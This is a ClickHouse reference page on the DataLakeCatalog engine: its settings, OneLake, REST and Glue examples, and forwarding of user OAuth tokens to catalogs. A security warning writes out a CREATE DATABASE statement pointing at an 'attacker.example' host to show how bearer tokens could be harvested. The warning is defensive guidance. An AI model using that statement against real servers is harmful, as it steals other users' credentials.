---
description: 'The DataLakeCatalog database engine enables you to connect ClickHouse to external data catalogs and query open table format data'
sidebar_label: 'DataLakeCatalog'
slug: /engines/database-engines/datalakecatalog
title: 'DataLakeCatalog'
doc_type: 'reference'
---

The `DataLakeCatalog` database engine enables you to connect ClickHouse to external
data catalogs and query open table format data without the need for data duplication.
This transforms ClickHouse into a powerful query engine that works seamlessly with
your existing data lake infrastructure.

## Supported catalogs {#supported-catalogs}

The `DataLakeCatalog` engine supports the following data catalogs:

- **AWS Glue Catalog** - For Iceberg tables in AWS environments
- **Databricks Unity Catalog** - For Delta Lake and Iceberg tables
- **Hive Metastore** - Traditional Hadoop ecosystem catalog
- **REST Catalogs** - Any catalog supporting the Iceberg REST specification

## Creating a database {#creating-a-database}

You will need to enable the relevant settings below to use the `DataLakeCatalog` engine:

```sql
SET allow_experimental_database_iceberg = 1;
SET allow_experimental_database_unity_catalog = 1;
SET allow_experimental_database_glue_catalog = 1;
SET allow_experimental_database_hms_catalog = 1;
SET allow_experimental_database_paimon_rest_catalog = 1;
```

Databases with the `DataLakeCatalog` engine can be created using the following syntax:

```sql
CREATE DATABASE database_name
ENGINE = DataLakeCatalog(catalog_endpoint[, user, password])
SETTINGS
catalog_type,
[...]
```

The following settings are supported:

| Setting                 | Description                                                                                   |
|-------------------------|-----------------------------------------------------------------------------------------------|
| `catalog_type`          | Type of catalog: `glue`, `unity` (Delta), `rest` (Iceberg), `hive`, `onelake` (Iceberg)       |
| `warehouse`             | The warehouse/database name to use in the catalog.                                            |
| `catalog_credential`    | Authentication credential for the catalog (e.g., API key or token)                            |
| `auth_header`           | Custom HTTP header for authentication with the catalog service                                |
| `auth_scope`            | OAuth2 scope for authentication (if using OAuth)                                              |
| `storage_endpoint`      | Endpoint URL for the underlying storage                                                       |
| `oauth_server_uri`      | URI of the OAuth2 authorization server for authentication                                     |
| `vended_credentials`    | Boolean indicating whether to use vended credentials from the catalog (supports AWS S3 and Azure ADLS Gen2) |
| `vended_credentials_cache_ttl` | Maximum cache entry lifetime (in seconds) for vended credentials (REST catalogs only). Default `300`; `0` disables caching. |
| `aws_access_key_id`     | AWS access key ID for S3/Glue access (if not using vended credentials)                        |
| `aws_secret_access_key` | AWS secret access key for S3/Glue access (if not using vended credentials)                    |
| `region`                | AWS region for the service (e.g., `us-east-1`)                                                |
| `dlf_access_key_id`     | Access key ID for DLF access                                                                  |
| `dlf_access_key_secret` | Access key Secret for DLF access                                                              |
| `namespaces`            | Comma-separated list of namespaces, implemented for catalog types: `rest`, `glue` and `unity` |
| `oauth_forward_user_token` | Authenticate to the catalog as the user running the query instead of as the shared service identity. Iceberg REST and Glue only. See [Forwarding the user's identity to the catalog](#user-token-forwarding) |
| `oauth_token_exchange_uri` | Empty (the default) forwards the user's token unchanged; non-empty performs an RFC 8693 token exchange at this URL first |
| `oauth_subject_token_type` | RFC 8693 `subject_token_type` of the forwarded token. Default `urn:ietf:params:oauth:token-type:access_token` |
| `oauth_requested_token_type` | RFC 8693 `requested_token_type`; empty omits the field. Default `urn:ietf:params:oauth:token-type:access_token` |
| `oauth_forward_actor_token` | Send the service principal's own token as the RFC 8693 `actor_token`. Default `0`. See [Delegation with an actor token](#user-token-forwarding-actor-token) |
| `oauth_user_token_cache_ttl` | Maximum lifetime (in seconds) of a cached exchanged session token; `0` disables caching. Default `300` |

## Examples {#examples}

See below sections for examples of using the `DataLakeCatalog` engine:

* [Unity Catalog](/use-cases/data-lake/unity-catalog)
* [Glue Catalog](/use-cases/data-lake/glue-catalog)
* OneLake Catalog
    Can be used by enabling `allow_experimental_database_iceberg` or `allow_database_iceberg`.
```sql
CREATE DATABASE database_name
ENGINE = DataLakeCatalog(catalog_endpoint)
SETTINGS
    catalog_type = 'onelake',
    warehouse = warehouse,
    onelake_tenant_id = tenant_id,
    oauth_server_uri = server_uri,
    auth_scope = auth_scope,
    onelake_client_id = client_id,
    onelake_client_secret = client_secret;
SHOW TABLES IN database_name;
SELECT count() from database_name.table_name;
```
To authenticate without sharing a client secret, set `onelake_bearer_token` to a pre-obtained bearer token (scoped to `https://storage.azure.com`) instead of `onelake_client_id`/`onelake_client_secret`. ClickHouse does not refresh the token, so the database must be recreated after it expires.

## Forwarding the user's identity to the catalog {#user-token-forwarding}

By default ClickHouse talks to a catalog as a single shared service identity -- `catalog_credential`
or `auth_header` for an Iceberg REST catalog, static AWS keys or an assumed role for Glue. The
catalog therefore cannot see, authorize or audit the human behind a query, and every ClickHouse user
gets identical catalog and storage access.

With `oauth_forward_user_token = 1` the catalog is contacted as the user who is running the query.
The identity that authenticated to ClickHouse becomes the identity the catalog authorizes, and the
storage credentials that identity gets are scoped to it.

This requires:

- the server-level [`enable_token_forwarding`](/operations/server-configuration-parameters/settings#enable_token_forwarding)
  setting, which is `false` by default. Without it the token is destroyed right after
  authentication and nothing can be forwarded;
- `catalog_type = 'rest'` or `catalog_type = 'glue'`. No other catalog type can authenticate as the
  querying user, so the setting is rejected for them rather than silently ignored;
- users who authenticate with a token -- an `Authorization: Bearer` HTTP header, or `--jwt` for the
  native protocol. See [Token-based authentication](/en/operations/external-authenticators/oauth).

How the token is used depends on the catalog. An Iceberg REST catalog accepts bearer tokens, so the
token is presented to it directly, optionally after an exchange. Glue does not: it authenticates
with AWS SigV4, so the token never goes to the catalog at all and is exchanged at AWS STS for
temporary credentials instead. See [Glue](#user-token-forwarding-glue).

:::danger `CREATE DATABASE` becomes a privileged operation
The token is sent to the URL that whoever created the database chose. With forwarding enabled,
anyone who can run `CREATE DATABASE d ENGINE = DataLakeCatalog('https://attacker.example/')` can
harvest the bearer token of every user who queries that database. Grant `CREATE DATABASE`
accordingly and keep `remote_url_allow_hosts` restrictive.
:::

The sections up to [Glue](#user-token-forwarding-glue) describe the Iceberg REST catalog.

### Passthrough: the default {#user-token-forwarding-passthrough}

On its own, `oauth_forward_user_token = 1` forwards the user's bearer token to the catalog
unchanged. This is what Lakekeeper, Nessie and Polaris-with-an-external-IdP accept, and it needs no
token endpoint and no client credentials:

```sql
CREATE DATABASE demo
ENGINE = DataLakeCatalog('http://lakekeeper:8181/catalog')
SETTINGS
    catalog_type = 'rest',
    warehouse = 'demo',
    oauth_forward_user_token = 1;
```

Because one token is presented both to ClickHouse and to the catalog, its audience must cover
both. With Keycloak this usually means adding an audience mapper to the ClickHouse client so the
issued token carries the catalog's audience as well.

### Token exchange: opt-in {#user-token-forwarding-exchange}

Setting `oauth_token_exchange_uri` switches to an [RFC 8693](https://www.rfc-editor.org/rfc/rfc8693)
token exchange against that URL, and the token obtained there is what the catalog sees. The
presence of the URI *is* the mode -- there is no separate mode setting.

Point it at your IdP's token endpoint to obtain a token whose audience the catalog accepts (the
flow Lakekeeper documents):

```sql
CREATE DATABASE demo
ENGINE = DataLakeCatalog('http://lakekeeper:8181/catalog')
SETTINGS
    catalog_type = 'rest',
    warehouse = 'demo',
    catalog_credential = 'clickhouse:<client-secret>',
    auth_scope = 'lakekeeper',
    oauth_forward_user_token = 1,
    oauth_token_exchange_uri = 'http://keycloak:8080/realms/demo/protocol/openid-connect/token';
```

The exchange request authenticates itself with `client_id`/`client_secret` parsed out of
`catalog_credential`, sent in the form body -- standard OAuth token-endpoint client authentication.
`catalog_credential` is therefore mandatory when `oauth_token_exchange_uri` is set, and optional
otherwise. `auth_scope` is reused as the exchange `scope`; its default value `PRINCIPAL_ROLE:ALL`
is Polaris-specific and must be overridden for other targets (`scope = 'lakekeeper'` for
Keycloak to Lakekeeper).

`oauth_token_exchange_uri` may also point at a catalog's own `/v1/oauth/tokens` endpoint. Note that
the Iceberg REST specification marks that endpoint **deprecated for removal** ("not recommended to
implement… will be removed in Iceberg 2.0"), and several widely deployed catalogs (Lakekeeper among
them) do not implement it at all. That is why the endpoint can only be reached by writing its URL
out in full.

### Delegation with an actor token {#user-token-forwarding-actor-token}

By default the exchange asks for plain impersonation: the token the catalog sees names the user and
nothing else. With `oauth_forward_actor_token = 1` the exchange also carries an `actor_token`, so a
server that implements RFC 8693 delegation can see both parties -- `sub` is the user and `act` is
ClickHouse -- and log or authorize accordingly. The setting requires `oauth_token_exchange_uri` and
is rejected without it.

The actor token is the service principal's own token, obtained with a `client_credentials` grant
against `oauth_server_uri` (or the catalog's `/v1/oauth/tokens` when that setting is empty) using
the credentials from `catalog_credential`. It is minted on first use and reused until it expires,
and it is only ever sent as `actor_token` -- no catalog request is signed with it. Because of it,
the `DataLakeRestCatalogAuthTokenRetrieve` profile event is expected to be non-zero with this
setting on; with it off, a non-zero value while forwarding means a request fell back to the shared
identity.

If minting the actor token fails, the query fails. ClickHouse does not fall back to an exchange
without delegation: silently downgrading is exactly what enabling the setting asks to avoid.

Only turn it on against a server that can validate the token. An IdP cannot validate a token it did
not issue for that purpose and will normally reject the whole exchange.

### Glue {#user-token-forwarding-glue}

AWS Glue authenticates with SigV4, never with a bearer token, so there is nothing to forward to it.
Instead the user's token is presented to AWS STS as a web identity: ClickHouse calls
`AssumeRoleWithWebIdentity` against `aws_role_arn` with that token, and the temporary credentials
it returns sign every Glue and S3 request the query makes. The `RoleSessionName` is the
ClickHouse user name, which is what CloudTrail records for those calls.

```sql
CREATE DATABASE glue_db
ENGINE = DataLakeCatalog
SETTINGS
    catalog_type = 'glue',
    region = 'us-east-1',
    aws_role_arn = 'arn:aws:iam::123456789012:role/data-lake-reader',
    oauth_forward_user_token = 1;
```

On the AWS side this needs the identity provider that issues your users' tokens registered as an
IAM OIDC identity provider, and a role whose trust policy accepts those tokens -- normally matched
on their `aud` and `sub` claims. The tokens ClickHouse authenticates users with and the tokens the
role trusts have to be the same tokens.

Differences from the Iceberg REST catalog:

- `aws_role_arn` is required. There is no forwarding without a role to assume.
- `aws_access_key_id` and `aws_secret_access_key` are rejected. Static keys are a second identity
  and would be used instead of the assumed one.
- `oauth_token_exchange_uri` and the other RFC 8693 settings are rejected. The exchange happens at
  AWS STS, whose endpoint follows from `region`.
- How much of the user's identity actually reaches authorization is an AWS question, not a
  ClickHouse one. `AssumeRoleWithWebIdentity` grants the permissions of the role, so every user who
  can assume it gets the same access unless you distinguish them further -- one role per group of
  users, or session tags matched by Lake Formation tag policies. Fine-grained per-user
  authorization on Glue needs AWS IAM Identity Center trusted identity propagation, which
  ClickHouse does not implement.

### What is and is not covered {#user-token-forwarding-scope}

- Every catalog request made on behalf of a query carries the user's identity: listing namespaces
  and tables, loading table metadata, and the write paths (`INSERT`, `ALTER`, mutations,
  `DROP TABLE`, snapshot expiry).
- Storage credentials vended by the catalog are cached per principal, so one user never receives
  the credentials the catalog issued to another. For Glue, the assumed session is cached per user
  token for the same reason, and signs the S3 reads as well as the Glue calls.
- Requests with no user token are refused with `CATALOG_USER_TOKEN_NOT_AVAILABLE`. ClickHouse never
  falls back to the service identity: that would turn an authorization failure into a query that
  succeeds under the wrong identity. `system.tables` and `SHOW TABLES` swallow catalog errors by
  design, so there they show an empty list rather than an error.
- SSO ends at the catalog. When `object_storage_cluster` is set, the table-scoped credentials the
  catalog vended are sent to the worker nodes as query-AST literals over the interserver channel.
  Configure `interserver_https_port` or a cluster `<secret>` before combining forwarding with a
  cluster read.
- HTTP re-authenticates on every request, so a rotated token takes effect immediately. A native
  TCP connection authenticates once at handshake time, so a long-lived `clickhouse-client --jwt`
  session must reconnect to pick up a fresh token.
- Rotate `catalog_credential` in place with `ALTER DATABASE ... MODIFY SETTING` (Iceberg REST only;
  a Glue catalog's settings cannot be altered). With token
  forwarding enabled, authenticate the statement with a user token. When token exchange is
  configured, ClickHouse exchanges that token using the new credentials. It reloads the catalog
  configuration as that user before applying the change. A successful rotation invalidates cached
  session tokens and vended storage credentials.

None of the forwarding settings hold a secret, so unlike `catalog_credential` they are shown in
full by `SHOW CREATE DATABASE` and `system.databases.engine_full`.

## Namespace filter {#namespace}

By default, ClickHouse reads tables from all namespaces available in the catalog. You can limit this behavior using the `namespaces` database setting. The value should be a comma‑separated list of namespaces that are allowed to be read.

Supported catalog types are `rest`, `glue` and `unity`.

For example, if the catalog contains three namespaces - `dev`, `stage`, and `prod` - and you want to read data only from dev and stage, set:
```
namespaces='dev,stage'
```

### Nested namespaces {#namespace-nested}

The Iceberg (`rest`) catalog supports nested namespaces. The `namespaces` filter accepts the following patterns:

- `namespace` - includes tables from the specified namespace, but not from its nested namespaces.
- `namespace.nested` - includes tables from the nested namespace, but not from the parent.
- `namespace.*` - includes tables from all nested namespaces, but not from the parent.

If you need to include both a namespace and its nested namespaces, specify both explicitly. For example:
```
namespaces='namespace,namespace.*'
```

The default value is '*', which means all namespaces are included.
